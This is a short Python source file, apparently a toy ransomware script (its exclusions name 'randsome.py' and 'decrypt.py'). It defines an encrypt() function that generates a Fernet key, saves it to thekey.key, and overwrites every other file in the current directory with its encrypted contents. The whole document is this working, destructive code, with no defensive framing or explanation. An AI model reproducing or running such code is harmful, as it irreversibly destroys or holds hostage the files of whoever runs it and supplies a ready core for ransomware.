def encrypt():
    import os
    from cryptography.fernet import Fernet
    files=[]
    
    for file in os.listdir():
        if file=="randsome.py" or file=="thekey.key" or file=="decrypt.py":
            continue
        if os.path.isfile(file):
            files.append(file)
    
    print(files)
    
    key = Fernet.generate_key()
    
    with open("thekey.key", "wb") as thekey:
        thekey.write(key)
    
    for file in files:
        with open(file, "rb") as thefile:
            content = thefile.read()
            encrypted_content = Fernet(key).encrypt(content)
            print(encrypted_content)
    
        with open(file, "wb") as thefile:
            thefile.write(encrypted_content)